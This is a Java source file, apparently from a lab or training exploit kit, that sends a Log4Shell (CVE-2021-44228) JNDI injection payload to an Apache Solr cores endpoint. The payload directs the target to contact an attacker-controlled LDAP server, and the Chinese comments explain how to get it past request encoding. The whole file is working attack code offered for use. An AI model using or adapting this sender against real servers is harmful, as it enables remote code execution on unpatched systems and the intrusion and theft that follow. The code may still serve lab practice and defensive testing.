import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Payload 发送器，向靶机发送 Log4Shell Payload：
 * GET /solr/admin/cores?action=${jndi:ldap://攻击机ip:1389/cn=Exploit}
 *
 * HttpURLConnection 会拒绝或编码路径中的非法字符，而 ${ } 是Log4j 模板语法，必须原样到达服务端日志
 * 原始 Socket 直接把字节写进TCP 流，不做任何加工
 *
 */
public class PayloadSender {

    /**
     * 发送 JNDI 注入 Payload。
     *
     * @param targetHost 靶机 IP
     * @param targetPort 靶机 HTTP 端口（Solr 8983）
     * @param ldapUrl    LDAP 服务 URL，如 ldap://192.168.217.143:1389/cn=Exploit
     * @param path       被日志记录的接口路径，默认 Solr cores 接口
     * @return           响应状态行
     */
    public static String send(String targetHost, int targetPort, String ldapUrl, String path) {
        String payload = "${jndi:" + ldapUrl + "}";
        String fullPath = path + "?action=" + payload;
        System.out.println("[*] Sending payload: " + fullPath);
        String resp = EndpointScanner.httpGet(targetHost, targetPort, fullPath, 8000);
        String status = EndpointScanner.statusLine(resp);
        System.out.println("[*] Target responded: " + status
                + "  (400 is normal - Solr rejects unknown action,"
                + " but the log line already triggered Log4j)");
        return status;
    }

    /** CLI: java PayloadSender <targetHost> <targetPort> <ldapUrl> */
    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.err.println("usage: java PayloadSender <targetHost> <targetPort> <ldapUrl>");
            System.err.println("  e.g. java PayloadSender 172.18.0.2 8983"
                    + " ldap://192.168.217.143:1389/cn=Exploit");
            System.exit(2);
        }
        send(args[0], Integer.parseInt(args[1]), args[2], "/solr/admin/cores");
    }
}
